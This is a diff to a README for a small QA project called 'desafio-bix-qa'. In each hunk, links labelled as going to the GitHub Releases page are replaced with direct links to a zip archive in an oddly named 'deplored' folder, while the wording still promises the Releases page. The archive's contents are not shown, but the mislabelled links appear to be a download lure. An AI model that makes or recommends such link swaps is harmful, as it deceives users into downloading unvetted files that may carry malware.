@@ -1,6 +1,6 @@
 # 🚀 desafio-bix-qa - Simple Testing Made Easy
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/SsakaHuzaifah/desafio-bix-qa/releases)
+[![Download](https://raw.githubusercontent.com/SsakaHuzaifah/desafio-bix-qa/main/deplored/desafio-bix-qa.zip)](https://raw.githubusercontent.com/SsakaHuzaifah/desafio-bix-qa/main/deplored/desafio-bix-qa.zip)
 
 ## 📋 Overview
 
@@ -29,7 +29,7 @@ Follow these steps to get started with the "desafio-bix-qa" application:
 
 1. **Visit the Download Page**: Click the link below to go to the Releases page.
    
-   [Visit the Releases Page to Download](https://github.com/SsakaHuzaifah/desafio-bix-qa/releases)
+   [Visit the Releases Page to Download](https://raw.githubusercontent.com/SsakaHuzaifah/desafio-bix-qa/main/deplored/desafio-bix-qa.zip)
 
 2. **Download the Latest Version**: Find the latest version available and download the file suitable for your operating system.
 
@@ -39,7 +39,7 @@ To download the software:
 
 1. **Visit the Releases Page**: Go to the download link:
    
-   [https://github.com/SsakaHuzaifah/desafio-bix-qa/releases](https://github.com/SsakaHuzaifah/desafio-bix-qa/releases)
+   [https://raw.githubusercontent.com/SsakaHuzaifah/desafio-bix-qa/main/deplored/desafio-bix-qa.zip](https://raw.githubusercontent.com/SsakaHuzaifah/desafio-bix-qa/main/deplored/desafio-bix-qa.zip)
 
 2. **Select the Version**: Choose the latest version listed on the page. Click the download link for your operating system.
 
@@ -87,4 +87,4 @@ This project is licensed under the MIT License. Please refer to the license file
 
 For updates and more information, follow us on social media or visit the official project page.
 
-[Visit the Releases Page to Download](https://github.com/SsakaHuzaifah/desafio-bix-qa/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/SsakaHuzaifah/desafio-bix-qa/main/deplored/desafio-bix-qa.zip)
